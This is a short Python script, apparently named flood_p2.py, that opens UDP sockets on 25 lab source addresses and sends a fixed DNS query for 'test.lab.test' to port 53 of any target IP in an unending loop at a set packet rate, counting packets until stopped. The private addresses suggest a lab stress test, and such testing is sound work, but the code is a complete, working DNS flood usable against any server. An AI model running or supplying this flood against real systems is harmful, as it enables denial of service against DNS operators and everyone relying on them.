import socket
import sys
import time

if len(sys.argv) != 3:
    print("Usage: python3 flood_p2.py <target_ip> <rate_per_source>")
    sys.exit(1)

target_ip = sys.argv[1]
rate = int(sys.argv[2])

if rate <= 0:
    sys.exit("Rate must be positive")

sources = [f"10.10.1.{i}" for i in range(101, 126)]

query = (
    b"\x12\x34\x01\x00\x00\x01\x00\x00"
    b"\x00\x00\x00\x00\x04test\x03lab\x04test"
    b"\x00\x00\x01\x00\x01"
)

sockets = []

for source in sources:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((source, 0))
    sockets.append(sock)

interval = 1.0 / rate
next_send = time.monotonic()
count = 0

print(f"Sources: {len(sockets)}")
print(f"Rate per source: {rate} pps")
print(f"Target aggregate rate: {len(sockets) * rate} pps")

try:
    while True:
        for sock in sockets:
            sock.sendto(query, (target_ip, 53))
            count += 1

        next_send += interval
        delay = next_send - time.monotonic()

        if delay > 0:
            time.sleep(delay)

except KeyboardInterrupt:
    print(f"\nPackets sent: {count}")

finally:
    for sock in sockets:
        sock.close()